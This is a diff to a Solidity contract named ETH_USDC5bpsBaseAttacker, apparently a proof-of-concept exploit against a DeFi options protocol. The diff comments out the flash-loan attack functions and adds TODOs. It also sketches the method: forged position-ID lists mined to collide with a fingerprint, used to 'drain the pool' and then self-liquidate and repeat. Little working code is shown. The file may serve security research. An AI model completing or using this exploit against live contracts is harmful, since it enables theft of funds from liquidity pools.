@@ -22,6 +22,7 @@ int24 constant MIN_V3POOL_TICK = -887272;
 int24 constant MAX_V3POOL_TICK = 887272;
 
 contract ETH_USDC5bpsBaseAttacker is IFlashLoanReceiver {
+    // TODO: Mine for new ones of these
     uint256[] fake_token_uints = [
         // fake list of TokenId uints that hashes to desired value
         0x004000000c000040000008000040000004000040000000020001000000000002,
@@ -286,6 +287,9 @@ contract ETH_USDC5bpsBaseAttacker is IFlashLoanReceiver {
     ISFPM sfpm = ISFPM(SFPM);
 
     function takeFlashLoanAndAttack() public {
+
+    }
+      /* TODO: Uncomment this once all the TODOs are addressed
         uint256 initialAssets0 = token0.balanceOf(address(this)); // TODO: Make this eth native balance
         uint256 initialAssets1 = token1.balanceOf(address(this));
         console.log("<<<< BEFORE ATTACK: initial token 0 balance: ", initialAssets0);
@@ -325,6 +329,7 @@ contract ETH_USDC5bpsBaseAttacker is IFlashLoanReceiver {
         );
         console.log("--------------------------------------------------------");
     }
+    */
 
     // This function is called by the flash loan provider
     // We use it to execute our attack logic after taking a flash loan
@@ -335,6 +340,8 @@ contract ETH_USDC5bpsBaseAttacker is IFlashLoanReceiver {
         address, // initiator,
         bytes calldata // params
     ) public returns (bool) {
+    }
+      /* TODO: Uncomment this once all the TODOs are addressed
         console.log("<<<< ATTACKER: executeOperation() called");
 
         // Phase 1: Drain the pool
@@ -519,7 +526,9 @@ contract ETH_USDC5bpsBaseAttacker is IFlashLoanReceiver {
         console.log("my final token 1 balance: ", token1.balanceOf(address(this)));
         console.log("------------------------");
 
+        // TODO TODO TODO: The first thing we have to do is, once the above vals are all set, print this fingerprint out:
         console.log('posIdList2 fingerprint', generateFingerprint(posIdList2, 0));
+        // Which we can then drop into find_posidlist_collisions.py, and set fake_token_uints above, which makes the whole script work
         console.log('fakeTokenIdList fingerprint', generateFingerprint(fakeTokenIdList, 0));
 
         // now liquidate my own position and repeat...
@@ -552,4 +561,5 @@ contract ETH_USDC5bpsBaseAttacker is IFlashLoanReceiver {
     // function getTickSpacingFromPoolId(uint64 poolId) public pure returns (int24) {
     //     return int24(uint24(poolId >> 48));
     // }
+    */
 }
